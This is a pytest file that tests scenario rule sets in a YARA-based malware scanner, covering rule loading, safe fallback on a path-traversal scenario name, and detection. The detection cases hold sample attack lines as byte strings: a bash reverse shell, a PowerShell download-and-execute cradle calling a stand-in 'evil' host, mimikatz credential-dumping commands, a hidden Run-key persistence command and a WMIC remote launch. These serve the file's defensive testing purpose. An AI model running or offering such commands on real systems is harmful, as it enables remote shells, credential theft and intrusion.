"""Tests for scenario rule-set selection (--scenario): discovery, loading,
accuracy on representative content, and safe fallback on bad input."""

from __future__ import annotations

import pytest

yara = pytest.importorskip("yara")

from scanner.engines.yara_engine import YaraEngine
from scanner.paths import available_scenarios

EXPECTED = {
    "ransomware", "credential_theft", "persistence",
    "lateral_movement", "powershell", "linux", "c2",
}


def test_available_scenarios_lists_bundled_sets():
    found = set(available_scenarios())
    assert EXPECTED.issubset(found), f"missing scenarios: {EXPECTED - found}"


def test_base_engine_loads_without_scenario():
    eng = YaraEngine()
    assert eng._rules is not None


def test_scenario_all_compiles():
    eng = YaraEngine(scenario="all")
    assert eng._rules is not None


def test_invalid_scenario_falls_back_to_base():
    # A bogus id must not raise and must still leave the base rules loaded.
    eng = YaraEngine(scenario="../../etc/passwd")
    assert eng._rules is not None


def test_unknown_scenario_falls_back_to_base():
    eng = YaraEngine(scenario="does_not_exist")
    assert eng._rules is not None


@pytest.mark.parametrize("scenario,payload,rule_prefix", [
    ("ransomware",
     b"All your files have been encrypted! To decrypt your files send bitcoin to recover@protonmail.com via .onion",
     "RANSOM_"),
    ("credential_theft",
     b"privilege::debug sekurlsa::logonpasswords exit gentilkiwi mimikatz",
     "CRED_"),
    ("persistence",
     b'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v X /d "powershell -w hidden -enc ZZ"',
     "PERSIST_"),
    ("lateral_movement",
     b"wmic /node:10.0.0.5 process call create powershell",
     "LATERAL_"),
    ("powershell",
     b"IEX (New-Object System.Net.WebClient).DownloadString('http://evil/a.ps1')",
     "PS_"),
    ("linux",
     b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
     "LIN_"),
])
def test_scenario_detects_representative_payload(scenario, payload, rule_prefix):
    eng = YaraEngine(scenario=scenario)
    hit = eng.scan(__import__("pathlib").Path("sample"), payload)
    assert hit is not None, f"{scenario} should match its payload"
    assert any(r.startswith("yara:" + rule_prefix) for r in hit.reasons), hit.reasons


def test_scenario_rules_do_not_fire_on_benign_text():
    eng = YaraEngine(scenario="all")
    benign = b"def add(a, b):\n    return a + b  # a perfectly ordinary helper\n"
    assert eng.scan(__import__("pathlib").Path("ok.py"), benign) is None
